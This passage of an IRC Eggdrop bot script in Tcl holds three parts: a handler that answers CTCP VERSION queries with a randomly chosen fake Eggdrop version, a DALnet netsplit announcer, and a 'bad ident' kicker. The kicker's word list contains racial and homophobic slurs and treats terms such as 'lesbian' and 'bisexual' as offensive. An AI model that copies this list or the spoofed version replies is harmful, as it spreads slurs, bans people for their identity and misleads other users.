  putserv "NOTICE $nick :\001VERSION [lindex $rv_versions($rv_style) [rand [llength $rv_versions($rv_style)]]]\001"
  return 1
}
proc rv_setversions {} {
  global rv_desc rv_versions rv_style
  set rv_desc(eggdrop) "Eggdrop"
  set rv_versions(eggdrop) ""
  for {set i 0} {$i <= 28} {incr i} { lappend rv_versions(eggdrop) "eggdrop v1.8.${i}" }
  for {set i 0} {$i <= 4} {incr i} { lappend rv_versions(eggdrop) "eggdrop v1.8.${i}" }
  set rv_desc(all) "All"
  set rv_versions(all) ""
  foreach name [array names rv_versions] { if {[string tolower $name] != "all"} { foreach version $rv_versions($name) { lappend rv_versions(all) $version } } }
  if {[lsearch -exact [array names rv_versions] $rv_style] == -1} { return 0 } else { return 1 }
}

## split
bind raw - QUIT netsplit:detect

proc netsplit:detect {from key arg} {
 global netsplit
 if {[info exists netsplit(detected)]} { return 0 }
 set arg [string trimleft [netext [split $arg]] :]
 if {[string equal "Quit:" [string range $arg 0 4]]} { return 0 }
 if {![regexp {^([[:alnum:][:punct:]]+)[[:space:]]([[:alnum:][:punct:]]+)$} $arg _arg server1 server2]} { return 0 }
 if {[string equal ".dal.net" [string range $server1 end-7 end]] && [string equal ".dal.net" [string range $server2 end-7 end]]} {
  set server1cut "[lindex [split $server1 .] 0]" ; set server2cut "[lindex [split $server2 .] 0]"
  foreach chan [channels] {
    if {[string match "*+split*" [channel info $chan]]} {
    set cmode [getchanmode $chan]
    if {[string match "*c*" $cmode]} { putquick "PRIVMSG $chan :4NetSplit 14detected bY $notm 14between 4server14 $server1cut 14with 4server14 $server2cut" }  { putquick "PRIVMSG $chan :4NetSplit 14detected bY $notm 14between 4server14 $server1cut 14with 4server14 $server2cut" }  
  } }
  set netsplit(detected) 1
  utimer 25 [list netsplit:unlock]
 }
}

proc netsplit:unlock {} {
 global netsplit
 if {[info exists netsplit(detected)]} { unset netsplit(detected) }
}

## split end
##################################################
### Start editing variables from here onwards! ###
##################################################

#Set the channel(s) you want this script active on.
#This script supports multiple channels.
#Usage: "#channel1 #channel2 #mychannel"
#(To activate on all channels use: "")
set badidentchans "#cyberhack"

#Set the *bad words* for the script to react on. 
#When users join a channel this script is activated 
#and their idents match this current world list, 
#they will be kicked/banned. (wildcards "*" are accepted)
#(Set/edit these words according to your needs)
#(I have already added some as examples)
set badidents {
"horny" "pelir" "penis" "kontol" "pantat" "jablai" "jablay" "gahab" "kaal" "asshole" "bitch" "slut" "cock" "cunt" "nigger" "dickhead" "hot*guy" "faggot" "prostitute" "whore" "lesbian" "naked" "horny" "orgasm" "bastard" "hooker" "rapist" "orgy" "penis" "vagina" "clit" "cybersex" "lesbian" "prick" "masturbate"
"masturbation" "jackoff" "blowjob" "bigcock" "bigdick" "wetpussy" "blow*job" "superbitch" "fuckwit" "dumbfuck" "fucknut" "bisexual" "transexual" "transvestite" "homosexual" "lesbi" "testicle" "sexual" "asswipe" "jackass" "dumbass" "intercourse" "clitoris" "incest" "nigga" "nigger" "molest" "breast" "boobs"
"fuck" "fuckers" "fucking" "sexual" "porno" "condom" "erect" "erection" "phuck" "masturbating" "motherfucker" "oralsex" "analsex" "wtf" "orgy" "stfu" 
}
#Set the flags for bot owners, masters, ops
#and users which to exempt from the script.
#(Usage: m, n, o, or "mnf", "fbo" etc)
set badidentexempt "mnof|mnof"

#For how long you wish (in minutes) to ban the 
#user with the bad ident. (mins)
set badidbantime 30


###############################################################################
### Don't edit anything else from this point onwards, even if you know tcl! ###
###############################################################################

bind join - * join:badident

proc join:badident {nick host hand chan} {
 global botnick badidents badidentchans badidentexempt badidbantime notc
  if {(([lsearch -exact [string tolower $badidentchans] [string tolower $chan]] != -1) || ($badidentchans == "*")) && ($nick != $botnick)} {
    foreach badident [string tolower $badidents] {
     set badidentban1 "*!*$badident*@*"
     set badidentban2 "*!*@[lindex [split $host @] 1]"
     set userident "[string trimleft [string tolower [lindex [split $host "@"] 0]] "~"]"
    if {[string match *$badident* [string tolower $userident]]} {
      if {([botisop $chan]) && (![isop $nick $chan]) && (![isvoice $nick $chan]) && (![matchattr $hand $badidentexempt $chan]) && ([onchan $nick $chan])} {
	  putquick "MODE $chan -o+bb $nick $badidentban1 $badidentban2"
       putquick "KICK $chan $nick :$notc \0034bad \00314ident \0034match \00314frøm\0034 $badident [banmsg]"
        timer $badidbantime "pushmode $chan -b $badidentban2"
        return 0
        }
      }
    }
  }
}
# (ain't i an asskicker?...)


putlog "Bad Ident Kicker Script v1.65.ab by \002F4R1S (ais_always@yahoo.com)\002 -=Loaded=-"
putlog "*ENABLED* Bad Ident Kicker Script on:\002 $badidentchans"

return

########################################
putlog "SaTPaM TCL Loaded"
###########################################
